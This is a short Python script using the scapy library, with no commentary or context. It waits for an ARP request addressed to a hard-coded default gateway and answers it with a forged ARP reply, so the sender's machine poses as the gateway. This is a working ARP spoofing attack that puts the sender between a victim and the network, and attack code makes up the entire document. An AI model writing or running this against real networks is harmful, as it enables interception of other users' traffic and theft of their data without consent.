import sys
i, o, e = sys.stdin, sys.stdout, sys.stderr
from scapy.all import *
sys.stdin, sys.stdout, sys.stderr = i, o, e

MAC_ADDRESS = "D0:57:7B:0F:7C:CE"
DEFAULT_GATEWAY = "10.7.15.254"

def filter_arp(packet):
    return ARP in packet and packet[ARP].pdst == DEFAULT_GATEWAY

def main():

    packets = sniff(count=1, lfilter=filter_arp)
    packet = packets[0]
    crafted_packet = Ether()/ARP(op=2, psrc=packet.pdst, pdst=packet.psrc, hwdst=packet.hwsrc)
    send(crafted_packet)

if __name__ == '__main__':
    main()
